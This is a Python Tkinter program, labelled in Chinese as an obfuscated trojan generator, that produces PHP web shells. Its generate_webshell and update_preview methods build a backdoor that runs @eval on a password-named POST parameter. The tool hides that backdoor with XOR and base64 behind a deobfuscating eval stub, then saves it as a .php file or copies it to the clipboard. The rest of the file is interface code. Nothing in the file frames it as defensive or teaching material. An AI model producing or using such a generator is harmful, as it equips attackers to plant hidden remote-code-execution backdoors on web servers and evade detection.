import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import base64
from datetime import datetime

class WebShellGenerator:
    def __init__(self, root):
        self.root = root
        self.root.title("雾蚀")
        self.root.geometry("900x700")
        self.root.configure(bg="#f0f4f8")
        
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # 颜色主题
        self.bg_color = "#f0f4f8"
        self.panel_bg = "#ffffff"
        self.text_bg = "#ffffff"
        self.text_fg = "#333333"
        self.accent_color = "#2c6fbb"
        self.success_color = "#28a745"
        self.warning_color = "#ffc107"
        self.error_color = "#dc3545"
        self.button_color = "#4a7dff"
        
        # 样式配置
        self.style.configure('TFrame', background=self.bg_color)
        self.style.configure('TLabel', background=self.bg_color, foreground="#444444", font=("Segoe UI", 10))
        self.style.configure('TButton', background=self.button_color, foreground="white", 
                            font=("Segoe UI", 10, "bold"), borderwidth=0, relief="flat")
        self.style.map('TButton', 
                      background=[('active', '#3a6de8')],
                      foreground=[('active', 'white')])
        self.style.configure('TEntry', fieldbackground='#ffffff', foreground="#333333", 
                            insertbackground="#333333", bordercolor="#ced4da", 
                            padding=5, font=("Segoe UI", 10))
        self.style.configure('TCombobox', fieldbackground='#ffffff', foreground="#333333")
        self.style.configure('TCheckbutton', background=self.bg_color, foreground="#444444")
        self.style.configure('TLabelframe', background=self.panel_bg, foreground=self.accent_color,
                            font=("Segoe UI", 10, "bold"), borderwidth=1, relief="solid")
        self.style.configure('TLabelframe.Label', background=self.panel_bg, foreground=self.accent_color)
        
        # 主框架
        self.main_frame = ttk.Frame(root, padding=20)
        self.main_frame.pack(fill=tk.BOTH, expand=True)
        
        title_frame = ttk.Frame(self.main_frame, style='TFrame')
        title_frame.pack(fill=tk.X, pady=(0, 15))
        
        # 标题
        title = ttk.Label(title_frame, text="混淆木马生成工具", 
                         font=("Segoe UI", 18, "bold"), foreground=self.accent_color)
        title.pack(side=tk.LEFT)
        
        self.create_settings_panel()
        
        self.create_preview_panel()
        
        self.zhuangtai_var = tk.StringVar(value="就绪 - 输入密码和密钥生成WebShell")
        status_bar = ttk.Frame(self.root, relief=tk.SUNKEN, style='TFrame')
        status_bar.pack(side=tk.BOTTOM, fill=tk.X, padx=0, pady=0)
        
        status_label = ttk.Label(status_bar, textvariable=self.zhuangtai_var, anchor=tk.W, font=("Segoe UI", 9), foreground="#555555")
        status_label.pack(side=tk.LEFT, padx=10)
        
        self.shijian_var = tk.StringVar()
        time_label = ttk.Label(status_bar, textvariable=self.shijian_var, anchor=tk.E, font=("Segoe UI", 9), foreground="#555555")
        time_label.pack(side=tk.RIGHT, padx=10)
        self.update_time()
        
        self.update_preview()
    
    def update_time(self):
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.shijian_var.set(now)
        self.root.after(1000, self.update_time)
    
    def create_settings_panel(self):
        settings_frame = ttk.LabelFrame(self.main_frame, text="生成设置", padding=15)
        settings_frame.pack(fill=tk.X, pady=(0, 15), padx=0)
        
        config_frame = ttk.Frame(settings_frame)
        config_frame.pack(fill=tk.X, pady=5)

        password_frame = ttk.Frame(config_frame)
        password_frame.pack(fill=tk.X, pady=10)
        ttk.Label(password_frame, text="连接密码:", width=12, anchor=tk.E, 
                 font=("Segoe UI", 10)).pack(side=tk.LEFT, padx=(0, 10))
        self.mima_var = tk.StringVar(value="")
        password_entry = ttk.Entry(password_frame, textvariable=self.mima_var, width=30)
        password_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        password_entry.bind("<KeyRelease>", lambda e: self.update_preview())
        
        key_frame = ttk.Frame(config_frame)
        key_frame.pack(fill=tk.X, pady=10)
        ttk.Label(key_frame, text="解混淆密钥:", width=12, anchor=tk.E, 
                 font=("Segoe UI", 10)).pack(side=tk.LEFT, padx=(0, 10))
        self.miyao_var = tk.StringVar(value="")
        key_entry = ttk.Entry(key_frame, textvariable=self.miyao_var, width=30)
        key_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        key_entry.bind("<KeyRelease>", lambda e: self.update_preview())
        
        filename_frame = ttk.Frame(config_frame)
        filename_frame.pack(fill=tk.X, pady=10)
        ttk.Label(filename_frame, text="输出文件名:", width=12, anchor=tk.E, 
                 font=("Segoe UI", 10)).pack(side=tk.LEFT, padx=(0, 10))
        self.wenjianming_var = tk.StringVar(value="")
        filename_entry = ttk.Entry(filename_frame, textvariable=self.wenjianming_var, width=30)
        filename_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        button_frame = ttk.Frame(settings_frame)
        button_frame.pack(fill=tk.X, pady=15)

        self.style.configure('Success.TButton', background=self.success_color, foreground="white")
        self.style.configure('Warning.TButton', background=self.warning_color, foreground="#333333")
        self.style.configure('Danger.TButton', background=self.error_color, foreground="white")
        
        save_btn = ttk.Button(button_frame, text="保存到文件", 
                             command=self.save_to_file, style='Success.TButton')
        save_btn.pack(side=tk.LEFT, padx=5, ipadx=15, ipady=5)
        
        copy_btn = ttk.Button(button_frame, text="复制到剪贴板", 
                             command=self.copy_to_clipboard, style='Warning.TButton')
        copy_btn.pack(side=tk.LEFT, padx=5, ipadx=15, ipady=5)
        
        clear_btn = ttk.Button(button_frame, text="清除预览", 
                              command=self.clear_preview, style='Danger.TButton')
        clear_btn.pack(side=tk.RIGHT, padx=5, ipadx=15, ipady=5)
    
    def create_preview_panel(self):
        preview_frame = ttk.LabelFrame(self.main_frame, text="WebShell预览", padding=10)
        preview_frame.pack(fill=tk.BOTH, expand=True, padx=0)
        
        toolbar = ttk.Frame(preview_frame)
        toolbar.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(toolbar, text="语法高亮:", font=("Segoe UI", 9)).pack(side=tk.LEFT, padx=(0, 5))

        self.gaoliang_var = tk.BooleanVar(value=True)
        highlight_btn = ttk.Checkbutton(toolbar, text="启用", 
                                      variable=self.gaoliang_var,
                                      command=self.toggle_highlight)
        highlight_btn.pack(side=tk.LEFT, padx=5)
        
        search_frame = ttk.Frame(toolbar)
        search_frame.pack(side=tk.RIGHT)
        
        ttk.Label(search_frame, text="搜索:", font=("Segoe UI", 9)).pack(side=tk.LEFT, padx=(0, 5))
        self.sousuo_var = tk.StringVar()
        search_entry = ttk.Entry(search_frame, textvariable=self.sousuo_var, width=20)
        search_entry.pack(side=tk.LEFT)
        search_entry.bind("<KeyRelease>", self.search_text)
        
        text_frame = ttk.Frame(preview_frame)
        text_frame.pack(fill=tk.BOTH, expand=True)
        
        self.yulan_text = scrolledtext.ScrolledText(
            text_frame, 
            bg=self.text_bg, 
            fg=self.text_fg, 
            insertbackground=self.text_fg,
            font=("Consolas", 10),
            wrap=tk.NONE,
            padx=10,
            pady=10,
            highlightthickness=1,
            highlightbackground="#ced4da",
            highlightcolor="#4a7dff"
        )
        self.yulan_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        self.hanghao_text = tk.Text(text_frame, width=4, bg="#f8f9fa", fg="#6c757d", 
                                   font=("Consolas", 10), padx=5, pady=10,
                                   state=tk.DISABLED, takefocus=0, bd=0,
                                   highlightthickness=1, highlightbackground="#ced4da")
        self.hanghao_text.pack(side=tk.LEFT, fill=tk.Y)
        
        self.yulan_text.bind("<Key>", lambda e: "break")
        
        self.yulan_text.bind("<MouseWheel>", self.sync_scroll)
        self.yulan_text.bind("<Button-4>", self.sync_scroll)
        self.yulan_text.bind("<Button-5>", self.sync_scroll)
    
    def sync_scroll(self, event):
        self.hanghao_text.yview_moveto(self.yulan_text.yview()[0])
        return "break"
    
    def toggle_highlight(self):
        if self.gaoliang_var.get():
            self.highlight_syntax()
        else:
            for tag in self.yulan_text.tag_names():
                self.yulan_text.tag_remove(tag, "1.0", tk.END)
    
    def update_line_numbers(self):
        lines = self.yulan_text.get("1.0", tk.END).split('\n')
        num_lines = len(lines) - 1
        
        self.hanghao_text.config(state=tk.NORMAL)
        self.hanghao_text.delete("1.0", tk.END)
        
        for i in range(1, num_lines + 1):
            self.hanghao_text.insert(tk.END, f"{i}\n")
        
        self.hanghao_text.config(state=tk.DISABLED)
    
    def xor_with_key(self, data, key):
        data_bytes = data.encode('utf-8')
        key_bytes = key.encode('utf-8')
        key_length = len(key_bytes)
        result = bytearray()
        for i in range(len(data_bytes)):
            result.append(data_bytes[i] ^ key_bytes[i % key_length])
        return bytes(result)
    
    def generate_webshell(self):
        mima = self.mima_var.get()
        miyao = self.miyao_var.get()
        
        php_code = f"""
if (isset($_POST['{mima}'])) {{
    @eval($_POST['{mima}']);
}}
"""
        return php_code
    
    def update_preview(self):
        try:
            mima = self.mima_var.get()
            miyao = self.miyao_var.get()

            if not mima or not miyao:
                self.yulan_text.delete(1.0, tk.END)
                self.yulan_text.insert(tk.END, "请输入密码和密钥以生成WebShell")
                self.update_line_numbers()
                self.zhuangtai_var.set("等待输入密码和密钥")
                return
            
            original_code = self.generate_webshell()
            
            obfuscated = self.xor_with_key(original_code, miyao)
            base64_encoded = base64.b64encode(obfuscated).decode('utf-8')
            
            final_php = f"""<?php
function xor_deobf($str, $key) {{
    $out = '';
    for($i = 0; $i < strlen($str); ++$i) {{
       $out .= chr(ord($str[$i]) ^ ord($key[$i % strlen($key)]));
    }}
    return $out;
}}
$key = "{miyao}";
$obfuscated = "{base64_encoded}";
$original_code = xor_deobf(base64_decode($obfuscated), $key);
eval($original_code);
?>"""
            
            self.yulan_text.delete(1.0, tk.END)
            self.yulan_text.insert(tk.END, final_php)
            
            self.update_line_numbers()
            
            if self.gaoliang_var.get():
                self.highlight_syntax()

            self.zhuangtai_var.set(f"WebShell已生成 - 代码长度: {len(final_php)} 字符")
        except Exception as e:
            self.zhuangtai_var.set(f"生成失败: {str(e)}")
    
    def highlight_syntax(self):

        self.yulan_text.tag_configure("php_tag", foreground="#d6336c", font=("Consolas", 10, "bold"))
        self.yulan_text.tag_configure("string", foreground="#20c997")
        self.yulan_text.tag_configure("keyword", foreground="#6610f2", font=("Consolas", 10, "bold"))
        self.yulan_text.tag_configure("function", foreground="#0d6efd")
        self.yulan_text.tag_configure("variable", foreground="#fd7e14")
        self.yulan_text.tag_configure("comment", foreground="#6c757d", font=("Consolas", 9))
        
        for tag in self.yulan_text.tag_names():
            self.yulan_text.tag_remove(tag, "1.0", tk.END)
        
        self.highlight_pattern(r"<\?php|\?>", "php_tag")

        self.highlight_pattern(r"\".*?\"", "string")
        self.highlight_pattern(r"'.*?'", "string")
        
        keywords = ["function", "for", "return", "if", "isset", "eval", "strlen", "chr", "ord"]
        for word in keywords:
            self.highlight_pattern(fr"\b{word}\b", "keyword")
        
        self.highlight_pattern(r"\b\w+\(\)", "function")
        
        self.highlight_pattern(r"\$\w+", "variable")
    
    def highlight_pattern(self, pattern, tag):
        start = "1.0"
        while True:
            start = self.yulan_text.search(pattern, start, stopindex=tk.END, regexp=True)
            if not start:
                break
            end = self.yulan_text.index(f"{start}+{len(self.yulan_text.get(start, f'{start} lineend'))}c")
            self.yulan_text.tag_add(tag, start, end)
            start = end
    
    def search_text(self, event):
        sousuo_text = self.sousuo_var.get()
        if not sousuo_text:
            return
        
        self.yulan_text.tag_remove("sousuo", "1.0", tk.END)
        
        self.yulan_text.tag_configure("sousuo", background="#ffc107", foreground="#333333")
        
        start = "1.0"
        count = 0
        while True:
            start = self.yulan_text.search(sousuo_text, start, stopindex=tk.END, nocase=1)
            if not start:
                break
            end = f"{start}+{len(sousuo_text)}c"
            self.yulan_text.tag_add("sousuo", start, end)
            count += 1
            start = end
        
        if count > 0:
            self.zhuangtai_var.set(f"找到 {count} 个匹配项")
        else:
            self.zhuangtai_var.set(f"未找到匹配项")
    
    def save_to_file(self):
        wenjianming = self.wenjianming_var.get()
        if not wenjianming:
            messagebox.showerror("错误", "请输入文件名", parent=self.root)
            return
        
        if not wenjianming.lower().endswith('.php'):
            wenjianming += '.php'
        
        save_path = filedialog.asksaveasfilename(
            initialfile=wenjianming,
            defaultextension=".php",
            filetypes=[("PHP Files", "*.php"), ("All Files", "*.*")]
        )
        
        if not save_path:
            return
        
        content = self.yulan_text.get(1.0, tk.END)
        if not content.strip():
            messagebox.showerror("错误", "没有内容可保存", parent=self.root)
            return
        
        try:
            with open(save_path, 'w', encoding='utf-8') as f:
                f.write(content)
            
            self.zhuangtai_var.set(f"文件已保存: {save_path}")
            messagebox.showinfo("成功", f"WebShell已成功保存到:\n{save_path}", parent=self.root)
        except Exception as e:
            self.zhuangtai_var.set(f"保存失败: {str(e)}")
            messagebox.showerror("错误", f"保存文件出错:\n{str(e)}", parent=self.root)
    
    def copy_to_clipboard(self):
        content = self.yulan_text.get(1.0, tk.END)
        if not content.strip():
            messagebox.showerror("错误", "没有内容可复制", parent=self.root)
            return
        
        self.root.clipboard_clear()
        self.root.clipboard_append(content)
        self.zhuangtai_var.set("代码已复制到剪贴板")
        messagebox.showinfo("成功", "WebShell代码已复制到剪贴板", parent=self.root)
    
    def clear_preview(self):
        self.yulan_text.delete(1.0, tk.END)
        self.update_line_numbers()
        self.zhuangtai_var.set("预览已清除")
        
        self.mima_var.trace_add("write", lambda *args: self.update_preview())
        self.miyao_var.trace_add("write", lambda *args: self.update_preview())

if __name__ == "__main__":
    root = tk.Tk()
    app = WebShellGenerator(root)
    root.mainloop()